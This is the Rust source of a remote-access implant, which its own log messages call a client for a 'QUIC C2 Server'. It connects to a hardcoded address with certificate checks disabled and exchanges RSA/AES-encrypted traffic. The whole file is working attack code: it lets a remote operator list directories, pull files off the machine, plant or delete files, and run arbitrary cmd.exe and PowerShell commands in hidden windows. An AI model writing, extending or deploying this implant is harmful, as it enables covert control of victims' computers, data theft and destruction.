// cargo build --target x86_64-pc-windows-gnu --release && cp target/x86_64-pc-windows-gnu/release/QUIC_RSA.exe ./QUIC_RSA.exe && rm -rf target Cargo.lock

use aes::Aes256;
use base64::{engine::general_purpose, Engine as _};
use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use quinn::{ClientConfig, Endpoint};
use rand::RngCore;
use rsa::pkcs8::DecodePublicKey;
use rsa::{Oaep, RsaPublicKey};
use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use rustls::{DigitallySignedStruct, SignatureScheme};
use serde_json::json;
use sha1::Sha1;
use std::fs;
use std::path::Path;
use std::sync::Arc;

type Aes256CbcEnc = cbc::Encryptor<Aes256>;
type Aes256CbcDec = cbc::Decryptor<Aes256>;



const HOST: &str = "192.168.1.107";
const PORT: u16 = 1010;
const AUTH_ID: &str = "3ec247d9-ea75-4092-886e-30225ebc3d7b";

const RSA_PUBLIC_KEY_PEM: &str = "-----BEGIN PUBLIC KEY-----\n\
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk\n\
jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU\n\
nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR\n\
ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1\n\
NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH\n\
0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y\n\
jwIDAQAB\n\
-----END PUBLIC KEY-----\n";



struct RsaCipher {
    public_key: RsaPublicKey,
}

impl RsaCipher {
    fn new(pem: &str) -> Result<Self, String> {
        let public_key = RsaPublicKey::from_public_key_pem(pem)
            .map_err(|e| format!("Failed to parse RSA public key: {}", e))?;
        Ok(Self { public_key })
    }

    fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, String> {
        let mut rng = rand::thread_rng();
        self.public_key
            .encrypt(&mut rng, Oaep::new::<Sha1>(), plaintext)
            .map_err(|e| format!("RSA encrypt error: {}", e))
    }
}



struct AesCipher {
    key: [u8; 32],
}

impl AesCipher {
    fn new(key: [u8; 32]) -> Self {
        Self { key }
    }

    fn encrypt(&self, plaintext: &[u8]) -> Vec<u8> {
        let mut iv = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut iv);

        let cipher = Aes256CbcEnc::new(&self.key.into(), &iv.into());
        let ciphertext = cipher.encrypt_padded_vec_mut::<Pkcs7>(plaintext);

        let mut out = Vec::with_capacity(16 + ciphertext.len());
        out.extend_from_slice(&iv);
        out.extend_from_slice(&ciphertext);
        out
    }

    fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        if data.len() < 16 {
            return Err("Invalid encrypted data (too short)".to_string());
        }
        if (data.len() - 16) % 16 != 0 {
            return Err("Invalid ciphertext length".to_string());
        }

        let iv: [u8; 16] = data[..16].try_into().unwrap();
        let ciphertext = &data[16..];

        let cipher = Aes256CbcDec::new(&self.key.into(), &iv.into());
        cipher
            .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
            .map_err(|e| format!("AES decrypt error: {:?}", e))
    }
}


#[cfg(windows)]
mod winapi {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Pipes::*;
    use windows::Win32::System::Threading::*;

    fn to_wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    pub fn run_process(full_cmd: &str) -> String {
        unsafe {
            let sa = SECURITY_ATTRIBUTES {
                nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
                lpSecurityDescriptor: std::ptr::null_mut(),
                bInheritHandle: TRUE,
            };

            let mut h_stdout_rd = HANDLE::default();
            let mut h_stdout_wr = HANDLE::default();

            if CreatePipe(&mut h_stdout_rd, &mut h_stdout_wr, Some(&sa), 0).is_err() {
                return "[-] CreatePipe failed".to_string();
            }

            let _ = SetHandleInformation(h_stdout_rd, HANDLE_FLAG_INHERIT.0, HANDLE_FLAGS(0));

            let mut si = STARTUPINFOW::default();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = h_stdout_wr;
            si.hStdError = h_stdout_wr;
            si.hStdInput = INVALID_HANDLE_VALUE;

            let mut pi = PROCESS_INFORMATION::default();

            let mut cmd_line = to_wide(full_cmd);

            let result = CreateProcessW(
                PCWSTR::null(),
                windows::core::PWSTR(cmd_line.as_mut_ptr()),
                None,
                None,
                TRUE,
                CREATE_NO_WINDOW,
                None,
                PCWSTR::null(),
                &si,
                &mut pi,
            );

            let _ = CloseHandle(h_stdout_wr);

            if result.is_err() {
                let _ = CloseHandle(h_stdout_rd);
                return "[-] CreateProcess failed".to_string();
            }

            use windows::Win32::Storage::FileSystem::ReadFile;

            let mut result_bytes: Vec<u8> = Vec::new();
            let mut buffer = [0u8; 4096];
            loop {
                let mut bytes_read: u32 = 0;
                let ok = ReadFile(
                    h_stdout_rd,
                    Some(&mut buffer),
                    Some(&mut bytes_read),
                    None,
                );
                if ok.is_err() || bytes_read == 0 {
                    break;
                }
                result_bytes.extend_from_slice(&buffer[..bytes_read as usize]);
            }

            let _ = WaitForSingleObject(pi.hProcess, INFINITE);

            let mut exit_code: u32 = 0;
            let _ = GetExitCodeProcess(pi.hProcess, &mut exit_code);

            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(h_stdout_rd);

            let output = String::from_utf8_lossy(&result_bytes).trim().to_string();
            let mut final_output = output.clone();
            if exit_code != 0 {
                final_output.push_str(&format!("\n[Exit Code: {}]", exit_code));
            }
            if final_output.is_empty() {
                return "[+] Command executed (no output)".to_string();
            }
            final_output
        }
    }
}

#[derive(Debug)]
struct SkipServerVerification;

impl SkipServerVerification {
    fn new() -> Arc<Self> {
        Arc::new(Self)
    }
}

impl ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

fn configure_client() -> ClientConfig {
    let crypto = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(SkipServerVerification::new())
        .with_no_client_auth();

    let mut config = ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(crypto).unwrap(),
    ));

    let mut transport = quinn::TransportConfig::default();
    transport.max_idle_timeout(Some(
        std::time::Duration::from_secs(30).try_into().unwrap(),
    ));
    transport.keep_alive_interval(Some(std::time::Duration::from_secs(5)));
    config.transport_config(Arc::new(transport));

    config
}

fn expand_user(path: &str) -> String {
    if path.starts_with('~') {
        if let Some(home) = dirs::home_dir() {
            return format!("{}{}", home.display(), &path[1..]);
        }
    }
    path.to_string()
}

fn browse_directory(path: &str) -> String {
    let expanded = expand_user(path);
    let path_ref = Path::new(&expanded);

    if !path_ref.exists() {
        return json!({
            "success": false,
            "error": format!("Path does not exist: {}", expanded),
            "current_path": expanded,
            "parent_path": null,
            "items": []
        })
        .to_string();
    }

    let mut items = Vec::new();

    if let Ok(entries) = fs::read_dir(&expanded) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };

            let is_dir = metadata.is_dir();
            let size = if is_dir { 0 } else { metadata.len() };
            let modified_time = metadata
                .modified()
                .ok()
                .map(|t| {
                    let datetime: chrono::DateTime<chrono::Local> = t.into();
                    datetime.format("%Y-%m-%d %H:%M:%S").to_string()
                })
                .unwrap_or_default();

            items.push(json!({
                "name": file_name,
                "type": if is_dir { "directory" } else { "file" },
                "size": size,
                "modified_time": modified_time
            }));
        }
    }

    items.sort_by(|a, b| {
        let a_dir = a["type"] == "directory";
        let b_dir = b["type"] == "directory";
        if a_dir != b_dir {
            return b_dir.cmp(&a_dir);
        }
        a["name"]
            .as_str()
            .unwrap_or("")
            .to_lowercase()
            .cmp(&b["name"].as_str().unwrap_or("").to_lowercase())
    });

    let parent = Path::new(&expanded)
        .parent()
        .map(|p| p.display().to_string())
        .filter(|p| !p.is_empty() && p != &expanded);

    json!({
        "success": true,
        "current_path": expanded,
        "parent_path": parent,
        "items": items
    })
    .to_string()
}

fn download_file(filepath: &str) -> String {
    if !Path::new(filepath).exists() {
        return format!("ERROR: File not found: {}", filepath);
    }

    match fs::read(filepath) {
        Ok(data) => {
            let filename = Path::new(filepath)
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            let b64 = general_purpose::STANDARD.encode(&data);
            format!("file-data:{}|{}|{}", filename, data.len(), b64)
        }
        Err(e) => format!("ERROR: {}", e),
    }
}

fn upload_file(filepath: &str, filedata_b64: &str) -> String {
    match general_purpose::STANDARD.decode(filedata_b64) {
        Ok(data) => {
            if let Some(parent) = Path::new(filepath).parent() {
                if !parent.exists() {
                    let _ = fs::create_dir_all(parent);
                }
            }
            match fs::write(filepath, &data) {
                Ok(_) => format!("SUCCESS: File uploaded to {}", filepath),
                Err(e) => format!("ERROR: {}", e),
            }
        }
        Err(e) => format!("ERROR: {}", e),
    }
}

fn delete_file(filepath: &str) -> String {
    let result = if Path::new(filepath).is_dir() {
        fs::remove_dir_all(filepath)
    } else {
        fs::remove_file(filepath)
    };

    match result {
        Ok(_) => format!("SUCCESS: Deleted {}", filepath),
        Err(e) => format!("ERROR: {}", e),
    }
}

fn rename_file(old_path: &str, new_path: &str) -> String {
    match fs::rename(old_path, new_path) {
        Ok(_) => format!("SUCCESS: Renamed to {}", new_path),
        Err(e) => format!("ERROR: {}", e),
    }
}

fn run_cmd_command(cmd: &str) -> String {
    #[cfg(windows)]
    {
        let full_cmd = format!("cmd.exe /c {}", cmd);
        return winapi::run_process(&full_cmd);
    }

    #[cfg(not(windows))]
    {
        use std::process::Command;
        let output = Command::new("sh").arg("-c").arg(cmd).output();
        match output {
            Ok(out) => {
                let mut result = String::from_utf8_lossy(&out.stdout).to_string();
                result.push_str(&String::from_utf8_lossy(&out.stderr));
                if !out.status.success() {
                    result.push_str(&format!(
                        "\n[Exit Code: {}]",
                        out.status.code().unwrap_or(-1)
                    ));
                }
                if result.trim().is_empty() {
                    "[+] Command executed (no output)".to_string()
                } else {
                    result.trim().to_string()
                }
            }
            Err(e) => format!("[-] CMD execution error: {}", e),
        }
    }
}

fn run_powershell_command(ps_cmd: &str) -> String {
    #[cfg(windows)]
    {
        let escaped = ps_cmd.replace('"', "\\\"");
        let full_cmd = format!(
            "powershell.exe -NoProfile -NonInteractive -Command {}",
            escaped
        );
        return winapi::run_process(&full_cmd);
    }

    #[cfg(not(windows))]
    {
        let _ = ps_cmd;
        "[-] PowerShell only available on Windows".to_string()
    }
}

fn execute_command(command: &str) -> String {
    let command = command.trim();
    if command.is_empty() {
        return "[no command received]".to_string();
    }

    if command == "ping" {
        return "pong".to_string();
    }

    if let Some(path) = command.strip_prefix("browse:") {
        let browse_path = if path.trim().is_empty() {
            std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| ".".to_string())
        } else {
            path.trim().to_string()
        };
        let data = browse_directory(&browse_path);
        let b64 = general_purpose::STANDARD.encode(data.as_bytes());
        return format!("browse-data-{}", b64);
    }

    if let Some(filepath) = command.strip_prefix("download-file:") {
        return download_file(filepath.trim());
    }

    if let Some(rest) = command.strip_prefix("upload-file:") {
        if let Some((filepath, filedata)) = rest.split_once('|') {
            return upload_file(filepath, filedata);
        }
        return "ERROR: Invalid upload format".to_string();
    }

    if let Some(filepath) = command.strip_prefix("delete-file:") {
        return delete_file(filepath.trim());
    }

    if let Some(rest) = command.strip_prefix("rename-file:") {
        if let Some((old, new)) = rest.split_once('|') {
            return rename_file(old, new);
        }
        return "ERROR: Invalid rename format".to_string();
    }

    let upper = command.to_uppercase();
    if upper.starts_with("EP ") {
        return run_powershell_command(command[3..].trim());
    }
    if upper.starts_with("EP") {
        return run_powershell_command(command[2..].trim());
    }

    run_cmd_command(command)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("Failed to install crypto provider");

    println!("[*] Starting QUIC Client (RSA + AES hybrid)...");


    let rsa = Arc::new(
        RsaCipher::new(RSA_PUBLIC_KEY_PEM).expect("Failed to load RSA public key"),
    );


    let mut aes_key = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut aes_key);
    let aes = Arc::new(AesCipher::new(aes_key));


    let client_cfg = configure_client();
    let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
    endpoint.set_default_client_config(client_cfg);

    let addr = format!("{}:{}", HOST, PORT).parse()?;
    let connection = endpoint.connect(addr, HOST)?.await?;
    println!("[+] Connected to QUIC C2 Server.");
    println!("[+] Auth ID: {}", AUTH_ID);



    let (mut auth_send, _auth_recv) = connection.open_bi().await?;
    let enc_auth = rsa.encrypt(AUTH_ID.as_bytes())?;
    tokio::io::AsyncWriteExt::write_all(&mut auth_send, &enc_auth).await?;
    auth_send.finish()?;
    println!("[+] Encrypted AUTH_ID sent ({} bytes)", enc_auth.len());


    let (mut key_send, _key_recv) = connection.open_bi().await?;
    let enc_aes_key = rsa.encrypt(&aes_key)?;
    tokio::io::AsyncWriteExt::write_all(&mut key_send, &enc_aes_key).await?;
    key_send.finish()?;
    println!("[+] Encrypted AES key sent ({} bytes)", enc_aes_key.len());

    println!("[+] Session established. Waiting for commands...");


    loop {
        match connection.accept_bi().await {
            Ok((mut send, mut recv)) => {
                let aes = aes.clone();
                tokio::spawn(async move {
                    if let Ok(data) = recv.read_to_end(4 * 1024 * 1024).await {


                        let command = match aes.decrypt(&data) {
                            Ok(plain) => String::from_utf8_lossy(&plain)
                                .replace('\r', "")
                                .trim()
                                .to_string(),
                            Err(e) => {
                                println!("[!] Failed to decrypt command: {}", e);
                                let _ = send.write_all(b"ERROR: decrypt failed").await;
                                let _ = send.finish();
                                return;
                            }
                        };

                        println!("[+] Received command: {}", command);

                        let response = if command.to_lowercase() == "ping" {
                            "pong".to_string()
                        } else {
                            let cmd = command.clone();
                            tokio::task::spawn_blocking(move || execute_command(&cmd))
                                .await
                                .unwrap_or_else(|e| format!("ERROR: {}", e))
                        };



                        let encrypted_response = aes.encrypt(response.as_bytes());
                        let _ = send.write_all(&encrypted_response).await;
                        let _ = send.finish();
                    }
                });
            }
            Err(e) => {
                println!("[!] Connection closed: {}", e);
                break;
            }
        }
    }

    Ok(())
}
